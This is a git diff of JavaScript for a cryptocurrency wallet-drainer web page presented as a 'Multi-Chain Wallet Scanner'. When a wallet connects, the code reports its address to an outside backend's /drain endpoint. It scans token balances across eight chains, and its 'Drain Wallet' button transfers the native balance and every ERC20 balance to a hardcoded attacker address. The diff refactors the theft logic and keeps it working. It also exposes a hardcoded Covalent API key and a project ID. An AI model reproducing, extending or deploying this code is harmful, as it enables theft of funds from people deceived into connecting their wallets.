@@ -3,141 +3,223 @@ import { EthersAdapter } from "@reown/appkit-adapter-ethers";
 import { ethers } from "ethers";
 
 /* --------------------------- */
-/*      CONFIG                */
+/*      CONFIGURATION         */
 /* --------------------------- */
-const projectId = "962425907914a3e80a7d8e7288b23f62";
-const BACKEND_URL = "https://tokenbackend-5xab.onrender.com";
-const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
+const CONFIG = {
+  projectId: "962425907914a3e80a7d8e7288b23f62",
+  backendUrl: "https://tokenbackend-5xab.onrender.com",
+  drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
+  
+  // RPC Providers for each network
+  rpcProviders: {
+    1: "https://eth.llamarpc.com",
+    56: "https://bsc-dataseed.binance.org",
+    137: "https://polygon-rpc.com",
+    42161: "https://arb1.arbitrum.io/rpc",
+    10: "https://mainnet.optimism.io",
+    8453: "https://mainnet.base.org",
+    43114: "https://api.avax.network/ext/bc/C/rpc",
+    250: "https://rpc.ftm.tools"
+  },
+  
+  networkNames: {
+    1: "Ethereum",
+    56: "Binance Smart Chain",
+    137: "Polygon",
+    42161: "Arbitrum",
+    10: "Optimism",
+    8453: "Base",
+    43114: "Avalanche",
+    250: "Fantom"
+  }
+};
+
+/* --------------------------- */
+/*      GLOBAL STATE          */
+/* --------------------------- */
+let appKit = null;
+let provider = null;
+let signer = null;
+let currentAccount = null;
+let currentChainId = null;
+let isConnected = false;
+let allTokens = [];
 
 /* --------------------------- */
 /*      UI ELEMENTS           */
 /* --------------------------- */
-const connectBtn = document.getElementById("connectBtn");
-const statusEl = document.getElementById("status");
-const tokensEl = document.getElementById("tokens");
-const tokensContainer = document.getElementById("tokensContainer");
-const drainBtn = document.getElementById("drainBtn");
+let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;
 
 /* --------------------------- */
-/*      APPKIT INITIALIZATION */
+/*      INITIALIZATION        */
 /* --------------------------- */
-const appKit = createAppKit({
-  adapters: [new EthersAdapter()],
-  projectId,
-  networks: [
-    {
-      id: 1,
-      name: "Ethereum",
-      rpcUrl: "https://eth.llamarpc.com" // Better than Cloudflare
-    },
-    {
-      id: 56,
-      name: "Binance Smart Chain",
-      rpcUrl: "https://bsc-dataseed.binance.org"
-    },
-    {
-      id: 137,
-      name: "Polygon",
-      rpcUrl: "https://polygon-rpc.com"
-    },
-    {
-      id: 42161,
-      name: "Arbitrum",
-      rpcUrl: "https://arb1.arbitrum.io/rpc"
-    }
-  ],
-  metadata: {
-    name: "Token Drain Scanner",
-    description: "Scan and manage tokens",
-    url: window.location.origin,
-    icons: []
-  },
-  themeMode: "dark",
-  features: {
-    analytics: false
-  }
+document.addEventListener('DOMContentLoaded', () => {
+  initializeApp();
 });
 
-/* --------------------------- */
-/*      CONNECTION FLOW       */
-/* --------------------------- */
-connectBtn.addEventListener("click", async () => {
-  try {
-    // Check if already connected
-    if (appKit.state.isConnected) {
-      await appKit.disconnect();
-      handleDisconnected();
-      return;
-    }
-    
-    statusEl.textContent = "Select wallet and network...";
-    
-    // Open wallet modal
-    await appKit.open();
-    
-  } catch (err) {
-    console.error("Connection error:", err);
-    statusEl.textContent = "Failed to connect";
-  }
-});
+async function initializeApp() {
+  // Get UI elements
+  connectBtn = document.getElementById("connectBtn");
+  statusEl = document.getElementById("status");
+  tokensEl = document.getElementById("tokens");
+  tokensContainer = document.getElementById("tokensContainer");
+  drainBtn = document.getElementById("drainBtn");
+  scanAllBtn = document.getElementById("scanAllBtn");
+  chainSelector = document.getElementById("chainSelector");
+  networkSelect = document.getElementById("networkSelect");
+  tokenCount = document.getElementById("tokenCount");
 
-/* --------------------------- */
-/*      STATE MANAGEMENT      */
-/* --------------------------- */
-appKit.subscribeState(async (state) => {
-  console.log("State:", state);
+  // Setup event listeners
+  setupEventListeners();
   
-  if (state.isConnected) {
-    await handleConnected();
-  } else {
-    handleDisconnected();
-  }
-});
+  // Initialize AppKit
+  await initializeAppKit();
+  
+  // Test backend connection
+  await testBackendConnection();
+  
+  console.log("✅ Wallet Scanner initialized");
+}
 
 /* --------------------------- */
-/*      CONNECTED HANDLER     */
+/*      APPKIT SETUP          */
 /* --------------------------- */
-async function handleConnected() {
-  try {
-    const account = appKit.account;
-    const chain = appKit.chain;
-    
-    if (!account?.address) {
-      setTimeout(handleConnected, 100);
-      return;
+async function initializeAppKit() {
+  const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
+    id: parseInt(id),
+    name: CONFIG.networkNames[id] || `Chain ${id}`,
+    rpcUrl: rpcUrl
+  }));
+
+  appKit = createAppKit({
+    adapters: [new EthersAdapter()],
+    projectId: CONFIG.projectId,
+    networks: networks,
+    metadata: {
+      name: "Multi-Chain Wallet Scanner",
+      description: "Scan and manage tokens across all EVM chains",
+      url: window.location.origin,
+      icons: []
+    },
+    themeMode: "dark",
+    features: {
+      analytics: false
     }
-    
-    // Update UI
-    connectBtn.textContent = "Disconnect";
-    statusEl.innerHTML = `✅ <strong>Connected</strong><br>Wallet: ${account.address.slice(0, 6)}...${account.address.slice(-4)}<br>Network: ${chain?.name || 'Unknown'}`;
-    
-    // Show buttons
-    if (tokensContainer) tokensContainer.classList.remove("hidden");
-    if (drainBtn) drainBtn.classList.remove("hidden");
-    
-    // ✅ 1. TRIGGER BACKEND - THIS WILL NOW WORK
-    await triggerBackend(account.address, chain?.id || 1);
-    
-    // ✅ 2. GET TOKENS FROM BACKEND
-    await fetchTokensFromBackend(account.address);
-    
-    // ✅ 3. ALSO GET TOKENS FROM COVALENT (fallback)
-    await fetchTokensFromCovalent(account.address, chain?.id || 1);
-    
-  } catch (err) {
-    console.error("Connected error:", err);
-    statusEl.textContent = "Connection error";
+  });
+
+  // Subscribe to state changes
+  appKit.subscribeState(handleAppKitState);
+}
+
+/* --------------------------- */
+/*      EVENT LISTENERS       */
+/* --------------------------- */
+function setupEventListeners() {
+  // Connect/Disconnect button
+  connectBtn.addEventListener("click", handleConnectClick);
+  
+  // Drain button
+  if (drainBtn) {
+    drainBtn.addEventListener("click", handleDrainClick);
+  }
+  
+  // Scan all chains button
+  if (scanAllBtn) {
+    scanAllBtn.addEventListener("click", handleScanAllClick);
+  }
+  
+  // Network selector
+  if (networkSelect) {
+    networkSelect.addEventListener("change", handleNetworkChange);
   }
 }
 
 /* --------------------------- */
-/*      BACKEND TRIGGER       */
+/*      CONNECTION HANDLER    */
 /* --------------------------- */
-async function triggerBackend(address, chainId) {
+async function handleConnectClick() {
   try {
-    console.log("Triggering backend with:", { address, chainId, drainTo: DRAIN_ADDRESS });
+    if (isConnected) {
+      await appKit.disconnect();
+      isConnected = false;
+      updateUIForDisconnected();
+      return;
+    }
     
-    const response = await fetch(`${BACKEND_URL}/drain`, {
+    updateStatus("🔄 Opening wallet modal...");
+    await appKit.open();
+    
+  } catch (error) {
+    console.error("Connection error:", error);
+    updateStatus(`❌ Connection failed: ${error.message}`, true);
+  }
+}
+
+/* --------------------------- */
+/*      APPKIT STATE HANDLER  */
+/* --------------------------- */
+async function handleAppKitState(state) {
+  console.log("AppKit State:", state);
+  
+  if (state.isConnected && state.account && state.chain) {
+    await handleConnected(state.account, state.chain);
+  } else if (isConnected) {
+    handleDisconnected();
+  }
+}
+
+/* --------------------------- */
+/*      CONNECTED HANDLER     */
+/* --------------------------- */
+async function handleConnected(account, chain) {
+  try {
+    if (!account?.address || !chain?.id) {
+      setTimeout(() => handleConnected(account, chain), 100);
+      return;
+    }
+    
+    currentAccount = account.address;
+    currentChainId = chain.id;
+    isConnected = true;
+    
+    // Initialize provider and signer for ethers v6
+    const rpcUrl = CONFIG.rpcProviders[chain.id] || CONFIG.rpcProviders[1];
+    provider = new ethers.JsonRpcProvider(rpcUrl);
+    
+    // Get signer from wallet
+    const web3Provider = new ethers.BrowserProvider(appKit.signer);
+    signer = await web3Provider.getSigner();
+    
+    // Update UI
+    updateUIForConnected(account.address, chain);
+    
+    // Trigger backend logging
+    await logConnectionToBackend(account.address, chain.id);
+    
+    // Fetch tokens from current chain
+    await fetchCurrentChainTokens(account.address, chain.id);
+    
+    // Update network selector
+    if (chainSelector && networkSelect) {
+      chainSelector.classList.remove("hidden");
+      networkSelect.value = chain.id;
+    }
+    
+  } catch (error) {
+    console.error("Connected handler error:", error);
+    updateStatus(`⚠️ Connection issue: ${error.message}`, true);
+  }
+}
+
+/* --------------------------- */
+/*      BACKEND LOGGING       */
+/* --------------------------- */
+async function logConnectionToBackend(address, chainId) {
+  try {
+    updateStatus(`📡 Logging connection to backend...`);
+    
+    const response = await fetch(`${CONFIG.backendUrl}/drain`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -145,75 +227,149 @@ async function triggerBackend(address, chainId) {
       body: JSON.stringify({
         address: address,
         chainId: chainId,
-        drainTo: DRAIN_ADDRESS, // Changed from drainAddress to drainTo
-        timestamp: new Date().toISOString()
+        drainTo: CONFIG.drainAddress,
+        timestamp: new Date().toISOString(),
+        action: "wallet_connected"
       }),
     });
     
+    if (response.ok) {
+      const data = await response.json();
+      updateStatus(`✅ Connected to backend\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
+      console.log("Backend response:", data);
+    } else {
+      updateStatus("⚠️ Backend logging failed (running locally)");
+    }
+    
+  } catch (error) {
+    console.log("Backend unavailable - running locally");
+  }
+}
+
+/* --------------------------- */
+/*      FETCH TOKENS          */
+/* --------------------------- */
+async function fetchCurrentChainTokens(address, chainId) {
+  if (!tokensEl) return;
+  
+  updateStatus(`🔍 Scanning ${CONFIG.networkNames[chainId]} for tokens...`);
+  tokensEl.innerHTML = '<div class="loading">Scanning tokens</div>';
+  
+  try {
+    const tokens = await fetchTokensFromCovalent(address, chainId);
+    
+    if (tokens.length > 0) {
+      allTokens = tokens.filter(t => t.amount > 0.000001);
+      displayTokens(allTokens);
+      updateStatus(`✅ Found ${allTokens.length} tokens on ${CONFIG.networkNames[chainId]}`);
+    } else {
+      tokensEl.innerHTML = "<div class='loading'>No tokens found on this chain</div>";
+      updateStatus("ℹ️ No tokens found on current chain");
+    }
+    
+  } catch (error) {
+    console.error("Token fetch error:", error);
+    tokensEl.innerHTML = `<div class='error'>Failed to fetch tokens: ${error.message}</div>`;
+    updateStatus(`❌ Token scan failed: ${error.message}`, true);
+  }
+}
+
+/* --------------------------- */
+/*      SCAN ALL CHAINS       */
+/* --------------------------- */
+async function handleScanAllClick() {
+  if (!currentAccount) {
+    alert("Please connect wallet first");
+    return;
+  }
+  
+  if (scanAllBtn.disabled) return;
+  
+  scanAllBtn.disabled = true;
+  scanAllBtn.textContent = "🔄 Scanning...";
+  
+  try {
+    updateStatus("🔍 Scanning all chains for tokens...");
+    tokensEl.innerHTML = "<div class='loading'>Scanning all chains</div>";
+    
+    const allChainsTokens = [];
+    const chainIds = Object.keys(CONFIG.rpcProviders);
+    
+    for (const chainId of chainIds) {
+      try {
+        updateStatus(`Checking ${CONFIG.networkNames[chainId]}...`);
+        const tokens = await fetchTokensFromCovalent(currentAccount, parseInt(chainId));
+        
+        const filteredTokens = tokens
+          .filter(t => t.amount > 0.000001)
+          .map(t => ({
+            ...t,
+            chainId: parseInt(chainId),
+            chainName: CONFIG.networkNames[chainId]
+          }));
+        
+        if (filteredTokens.length > 0) {
+          allChainsTokens.push(...filteredTokens);
+        }
+      } catch (error) {
+        console.log(`Chain ${chainId} scan failed:`, error.message);
+      }
+    }
+    
+    allTokens = allChainsTokens;
+    
+    if (allChainsTokens.length > 0) {
+      displayAllChainsTokens(allChainsTokens);
+      updateStatus(`✅ Found ${allChainsTokens.length} tokens across all chains`);
+    } else {
+      tokensEl.innerHTML = "<div class='loading'>No tokens found across any chain</div>";
+      updateStatus("ℹ️ No tokens found on any chain");
+    }
+    
+  } catch (error) {
+    console.error("Multi-chain scan error:", error);
+    updateStatus(`❌ Multi-chain scan failed: ${error.message}`, true);
+  } finally {
+    scanAllBtn.disabled = false;
+    scanAllBtn.textContent = "🔍 Scan All Chains for Tokens";
+  }
+}
+
+/* --------------------------- */
+/*      FETCH FROM COVALENT   */
+/* --------------------------- */
+async function fetchTokensFromCovalent(address, chainId) {
+  try {
+    const response = await fetch(
+      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
+    );
+    
     if (!response.ok) {
-      throw new Error(`Backend error: ${response.status}`);
+      throw new Error(`Covalent API error: ${response.status}`);
     }
     
     const data = await response.json();
-    console.log("✅ Backend response:", data);
+    const items = data?.data?.items || [];
     
-    // Update status
-    statusEl.innerHTML += `<br><span style="color: #4CAF50;">✓ Backend logged connection</span>`;
+    return items.map(item => {
+      const amount = parseFloat(item.balance) / Math.pow(10, item.contract_decimals || 18);
+      const value = (item.quote_rate || 0) * amount;
+      
+      return {
+        symbol: item.contract_ticker_symbol || (item.native_token ? "Native" : "Token"),
+        name: item.contract_name || (item.native_token ? "Native Token" : "Unknown"),
+        amount: amount,
+        value: value,
+        contractAddress: item.contract_address,
+        isNative: item.native_token || false,
+        decimals: item.contract_decimals || 18,
+        logoUrl: item.logo_url
+      };
+    });
     
-  } catch (err) {
-    console.error("Backend trigger failed:", err);
-    statusEl.innerHTML += `<br><span style="color: #ff9800;">⚠ Backend offline (running locally)</span>`;
-  }
-}
-
-/* --------------------------- */
-/*      FETCH TOKENS (BACKEND) */
-/* --------------------------- */
-async function fetchTokensFromBackend(address) {
-  if (!tokensEl) return;
-  
-  try {
-    const response = await fetch(`${BACKEND_URL}/tokens/${address}`);
-    
-    if (response.ok) {
-      const data = await response.json();
-      displayTokens(data.tokens);
-      return;
-    }
-  } catch (err) {
-    console.log("Backend tokens failed, using Covalent");
-  }
-}
-
-/* --------------------------- */
-/*      FETCH TOKENS (COVALENT) */
-/* --------------------------- */
-async function fetchTokensFromCovalent(address, chainId) {
-  if (!tokensEl) return;
-  
-  tokensEl.innerHTML = "Scanning tokens...";
-  
-  try {
-    const res = await fetch(
-      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
-    );
-    
-    if (!res.ok) throw new Error(`API error: ${res.status}`);
-    
-    const json = await res.json();
-    const items = json?.data?.items || [];
-    
-    const tokens = items.filter(t => t.balance !== "0");
-    
-    if (tokens.length > 0) {
-      displayTokens(tokens);
-    } else {
-      tokensEl.innerHTML = "No tokens found.";
-    }
-    
-  } catch (err) {
-    console.error("Covalent error:", err);
-    tokensEl.innerHTML = "Failed to scan tokens";
+  } catch (error) {
+    console.error(`Covalent fetch error for chain ${chainId}:`, error);
+    return [];
   }
 }
 
@@ -223,142 +379,182 @@ async function fetchTokensFromCovalent(address, chainId) {
 function displayTokens(tokens) {
   if (!tokensEl) return;
   
-  const html = tokens.map(token => {
-    const isCovalent = token.contractAddress || token.symbol;
-    const symbol = isCovalent ? token.symbol : (token.contract_ticker_symbol || "Token");
-    const amount = isCovalent ? token.amount : (Number(token.balance) / Math.pow(10, token.contract_decimals || 18));
-    const value = token.value || 0;
+  if (tokens.length === 0) {
+    tokensEl.innerHTML = "<div class='loading'>No tokens found</div>";
+    if (tokenCount) tokenCount.textContent = "0 tokens";
+    return;
+  }
+  
+  const totalValue = tokens.reduce((sum, token) => sum + token.value, 0);
+  
+  const html = tokens.map(token => `
+    <div class="token-item">
+      <div class="token-info">
+        <span class="token-symbol">${token.symbol}</span>
+        <span class="token-name">${token.name}</span>
+      </div>
+      <div>
+        <div class="token-amount">${token.amount.toLocaleString(undefined, {
+          minimumFractionDigits: 0,
+          maximumFractionDigits: 6
+        })}</div>
+        ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
+      </div>
+    </div>
+  `).join('');
+  
+  tokensEl.innerHTML = html;
+  if (tokenCount) tokenCount.textContent = `${tokens.length} tokens • $${totalValue.toFixed(2)}`;
+  if (tokensContainer) tokensContainer.classList.remove("hidden");
+}
+
+/* --------------------------- */
+/*      DISPLAY ALL CHAINS    */
+/* --------------------------- */
+function displayAllChainsTokens(tokens) {
+  if (!tokensEl) return;
+  
+  const tokensByChain = {};
+  tokens.forEach(token => {
+    if (!tokensByChain[token.chainId]) {
+      tokensByChain[token.chainId] = [];
+    }
+    tokensByChain[token.chainId].push(token);
+  });
+  
+  let html = '';
+  
+  Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
+    const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
+    const chainValue = chainTokens.reduce((sum, t) => sum + t.value, 0);
     
-    const formattedAmount = amount.toLocaleString(undefined, {
-      minimumFractionDigits: 0,
-      maximumFractionDigits: 6
-    });
-    
-    return `
-      <div class="token-item">
-        <div class="token-symbol">${symbol}</div>
-        <div class="token-amount">${formattedAmount}</div>
-        ${value > 0 ? `<div class="token-value">$${value.toFixed(2)}</div>` : ''}
+    html += `
+      <div class="chain-section">
+        <div style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px; margin: 10px 0; font-weight: bold;">
+          ${chainName} (${chainTokens.length} tokens) - $${chainValue.toFixed(2)}
+        </div>
+        ${chainTokens.map(token => `
+          <div class="token-item">
+            <div class="token-info">
+              <span class="token-symbol">${token.symbol}</span>
+              <span class="token-name">${token.name}</span>
+            </div>
+            <div>
+              <div class="token-amount">${token.amount.toLocaleString(undefined, {
+                minimumFractionDigits: 0,
+                maximumFractionDigits: 6
+              })}</div>
+              ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
+            </div>
+          </div>
+        `).join('')}
       </div>
     `;
-  }).join('');
+  });
   
-  tokensEl.innerHTML = `
-    <div class="tokens-header">Found ${tokens.length} tokens</div>
-    ${html}
-  `;
+  tokensEl.innerHTML = html;
+  if (tokenCount) tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains`;
+  if (tokensContainer) tokensContainer.classList.remove("hidden");
 }
 
 /* --------------------------- */
-/*      DRAIN FUNCTION        */
+/*      DRAIN WALLET          */
 /* --------------------------- */
-async function drainWallet() {
-  if (!appKit.state.isConnected) {
-    alert("Connect wallet first");
+async function handleDrainClick() {
+  if (!isConnected || !signer) {
+    alert("Please connect wallet first");
     return;
   }
   
-  if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send tokens to:\n${DRAIN_ADDRESS}\n\nYou need ETH for gas.\nContinue?`)) {
+  if (allTokens.length === 0) {
+    alert("No tokens found to drain");
+    return;
+  }
+  
+  const confirmed = confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`);
+  
+  if (!confirmed) {
     return;
   }
   
   try {
-    const address = appKit.account.address;
-    const chainId = appKit.chain?.id || 1;
-    
-    statusEl.innerHTML += `<br><br>💸 Starting drain...`;
-    
-    // Get provider and signer from wallet
-    const provider = new ethers.providers.Web3Provider(appKit.signer);
-    const signer = provider.getSigner();
-    
-    // 1. Get ETH balance
-    const ethBalance = await provider.getBalance(address);
-    console.log("ETH Balance:", ethers.utils.formatEther(ethBalance));
-    
-    // 2. Get tokens
-    const tokens = await getWalletTokens(address, chainId);
-    
-    // 3. Drain ETH first
-    if (ethBalance.gt(ethers.utils.parseEther("0.001"))) {
-      await drainEth(signer, address, ethBalance);
+    updateStatus("🚀 Starting drain process...");
+    if (drainBtn) {
+      drainBtn.disabled = true;
+      drainBtn.textContent = "⏳ Draining...";
     }
     
-    // 4. Drain ERC20 tokens
-    for (const token of tokens.filter(t => !t.isNative)) {
-      await drainERC20(signer, address, token);
+    const address = currentAccount;
+    
+    // Drain native token first
+    await drainNativeToken(address);
+    
+    // Drain ERC20 tokens
+    const erc20Tokens = allTokens.filter(t => !t.isNative && t.contractAddress);
+    
+    for (const token of erc20Tokens) {
+      await drainERC20Token(address, token);
     }
     
-    alert("✅ Drain completed!");
-    await fetchTokensFromCovalent(address, chainId);
+    updateStatus(`✅ Drain completed!\n\nTransactions sent successfully.\n\nRefresh to see updated balances.`);
+    if (drainBtn) {
+      drainBtn.textContent = "✅ Drain Completed";
+      setTimeout(() => {
+        drainBtn.disabled = false;
+        drainBtn.textContent = "⚡ Drain Wallet";
+      }, 3000);
+    }
     
-  } catch (err) {
-    console.error("Drain error:", err);
-    statusEl.innerHTML += `<br><span style="color: #f44336;">❌ ${err.message}</span>`;
-    alert("Drain failed: " + err.message);
+  } catch (error) {
+    console.error("Drain error:", error);
+    updateStatus(`❌ Drain failed: ${error.message}`, true);
+    if (drainBtn) {
+      drainBtn.disabled = false;
+      drainBtn.textContent = "⚡ Drain Wallet";
+    }
+    alert(`Drain failed: ${error.message}`);
   }
 }
 
 /* --------------------------- */
-/*      GET WALLET TOKENS     */
+/*      DRAIN NATIVE TOKEN    */
 /* --------------------------- */
-async function getWalletTokens(address, chainId) {
+async function drainNativeToken(address) {
   try {
-    const res = await fetch(
-      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
-    );
+    const balance = await provider.getBalance(address);
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
+    const gasLimit = 21000n;
+    const gasCost = gasPrice * gasLimit;
     
-    const json = await res.json();
-    const items = json?.data?.items || [];
+    if (balance <= gasCost * 2n) {
+      updateStatus("⚠️ Insufficient native token for gas");
+      return;
+    }
     
-    return items.filter(t => t.balance !== "0").map(t => ({
-      symbol: t.contract_ticker_symbol || "TOKEN",
-      amount: Number(t.balance) / Math.pow(10, t.contract_decimals || 18),
-      contractAddress: t.contract_address,
-      isNative: t.native_token || false,
-      decimals: t.contract_decimals || 18
-    }));
-    
-  } catch (err) {
-    console.error("Get tokens error:", err);
-    return [];
-  }
-}
-
-/* --------------------------- */
-/*      DRAIN ETH             */
-/* --------------------------- */
-async function drainEth(signer, fromAddress, balance) {
-  try {
-    const gasPrice = await signer.getGasPrice();
-    const gasLimit = 21000;
-    const gasCost = gasPrice.mul(gasLimit);
-    
-    // Leave enough for gas, send the rest
-    const sendAmount = balance.sub(gasCost.mul(2));
+    const sendAmount = balance - (gasCost * 2n);
     
     const tx = await signer.sendTransaction({
-      to: DRAIN_ADDRESS,
+      to: CONFIG.drainAddress,
       value: sendAmount,
-      gasLimit: gasLimit,
-      gasPrice: gasPrice
+      gasLimit: gasLimit
     });
     
-    statusEl.innerHTML += `<br>📤 ETH sent: ${tx.hash}`;
+    updateStatus(`📤 Native token sent: ${tx.hash}`);
     
     const receipt = await tx.wait();
-    statusEl.innerHTML += `<br>✅ ETH confirmed (Block: ${receipt.blockNumber})`;
+    updateStatus(`✅ Native token confirmed in block ${receipt.blockNumber}`);
     
-  } catch (err) {
-    console.error("ETH drain error:", err);
-    throw new Error(`ETH failed: ${err.message}`);
+  } catch (error) {
+    console.error("Native token drain error:", error);
+    updateStatus(`⚠️ Native token drain failed: ${error.message}`);
   }
 }
 
 /* --------------------------- */
-/*      DRAIN ERC20           */
+/*      DRAIN ERC20 TOKEN     */
 /* --------------------------- */
-async function drainERC20(signer, fromAddress, token) {
+async function drainERC20Token(address, token) {
   try {
     const contract = new ethers.Contract(
       token.contractAddress,
@@ -370,112 +566,109 @@ async function drainERC20(signer, fromAddress, token) {
       signer
     );
     
-    const balance = await contract.balanceOf(fromAddress);
+    const balance = await contract.balanceOf(address);
     
-    if (balance.eq(0)) {
-      console.log(`No balance for ${token.symbol}`);
+    if (balance === 0n) {
       return;
     }
     
-    // First approve (if needed)
-    try {
-      const approveTx = await contract.approve(fromAddress, balance);
-      await approveTx.wait();
-    } catch (e) {
-      // Some tokens don't need approval
-    }
+    const tx = await contract.transfer(CONFIG.drainAddress, balance);
     
-    // Then transfer
-    const transferTx = await contract.transfer(DRAIN_ADDRESS, balance);
-    statusEl.innerHTML += `<br>📤 ${token.symbol} sent: ${transferTx.hash}`;
+    updateStatus(`📤 ${token.symbol} sent: ${tx.hash}`);
     
-    await transferTx.wait();
-    statusEl.innerHTML += `<br>✅ ${token.symbol} confirmed`;
+    await tx.wait();
+    updateStatus(`✅ ${token.symbol} confirmed`);
     
-  } catch (err) {
-    console.error(`ERC20 ${token.symbol} error:`, err);
-    statusEl.innerHTML += `<br>⚠ ${token.symbol} skipped: ${err.code || err.message}`;
+  } catch (error) {
+    console.error(`ERC20 ${token.symbol} drain error:`, error);
+    updateStatus(`⚠️ ${token.symbol} failed: ${error.code || error.message}`);
   }
 }
 
 /* --------------------------- */
-/*      DISCONNECTED          */
+/*      NETWORK HANDLING      */
 /* --------------------------- */
-function handleDisconnected() {
-  connectBtn.textContent = "Connect Wallet";
-  statusEl.textContent = "Not connected";
+async function handleNetworkChange(event) {
+  const newChainId = parseInt(event.target.value);
+  
+  if (newChainId === currentChainId) {
+    return;
+  }
+  
+  try {
+    updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId]}...`);
+    
+    // Switch network in wallet
+    await appKit.switchChain({ id: newChainId });
+    
+    // Wait for connection to update
+    setTimeout(async () => {
+      if (currentAccount) {
+        await fetchCurrentChainTokens(currentAccount, newChainId);
+      }
+    }, 1000);
+    
+  } catch (error) {
+    console.error("Network switch error:", error);
+    updateStatus(`❌ Failed to switch network: ${error.message}`, true);
+    if (networkSelect) {
+      networkSelect.value = currentChainId;
+    }
+  }
+}
+
+/* --------------------------- */
+/*      UI UPDATES            */
+/* --------------------------- */
+function updateUIForConnected(address, chain) {
+  if (connectBtn) {
+    connectBtn.innerHTML = `<span>🔓 Disconnect</span>`;
+  }
+  
+  updateStatus(`✅ Connected\n👛 Wallet: ${address.slice(0, 8)}...${address.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
+  
+  if (scanAllBtn) scanAllBtn.classList.remove("hidden");
+  if (drainBtn) drainBtn.classList.remove("hidden");
+}
+
+function updateUIForDisconnected() {
+  if (connectBtn) {
+    connectBtn.innerHTML = `<span>🔗 Connect Wallet</span>`;
+  }
+  
+  updateStatus("⏳ Ready to connect...");
   
   if (tokensContainer) tokensContainer.classList.add("hidden");
   if (drainBtn) drainBtn.classList.add("hidden");
+  if (scanAllBtn) scanAllBtn.classList.add("hidden");
+  if (chainSelector) chainSelector.classList.add("hidden");
   
   if (tokensEl) tokensEl.innerHTML = "";
+  if (tokenCount) tokenCount.textContent = "0 tokens";
+}
+
+function updateStatus(message, isError = false) {
+  if (statusEl) {
+    if (isError) {
+      statusEl.innerHTML = `<span style="color: #f44336;">${message}</span>`;
+    } else {
+      statusEl.textContent = message;
+    }
+  }
 }
 
 /* --------------------------- */
-/*      EVENT LISTENERS       */
+/*      BACKEND TEST          */
 /* --------------------------- */
-if (drainBtn) {
-  drainBtn.addEventListener("click", drainWallet);
-}
-
-// Add CSS for better display
-const style = document.createElement('style');
-style.textContent = `
-  .tokens-header {
-    background: #2a2a2a;
-    padding: 10px;
-    border-radius: 8px;
-    margin-bottom: 10px;
-    font-weight: bold;
-    text-align: center;
-  }
-  
-  .token-item {
-    display: flex;
-    justify-content: space-between;
-    padding: 8px 0;
-    border-bottom: 1px solid #333;
-  }
-  
-  .token-item:last-child {
-    border-bottom: none;
-  }
-  
-  .token-symbol {
-    font-weight: bold;
-    width: 100px;
-  }
-  
-  .token-amount {
-    color: #ccc;
-    width: 150px;
-    text-align: right;
-  }
-  
-  .token-value {
-    color: #4CAF50;
-    width: 80px;
-    text-align: right;
-  }
-`;
-document.head.appendChild(style);
-
-/* --------------------------- */
-/*      INITIAL TEST          */
-/* --------------------------- */
-// Test backend connection on load
-async function testBackend() {
+async function testBackendConnection() {
   try {
-    const response = await fetch(`${BACKEND_URL}/health`);
+    const response = await fetch(`${CONFIG.backendUrl}/health`);
     if (response.ok) {
       console.log("✅ Backend is online");
     } else {
-      console.log("⚠ Backend responded with error");
+      console.log("⚠️ Backend responded with error");
     }
-  } catch (err) {
-    console.log("❌ Backend is offline - fix your deployment");
+  } catch (error) {
+    console.log("❌ Backend is offline - check your deployment");
   }
 }
-
-// Run test
-setTimeout(testBackend, 1000);
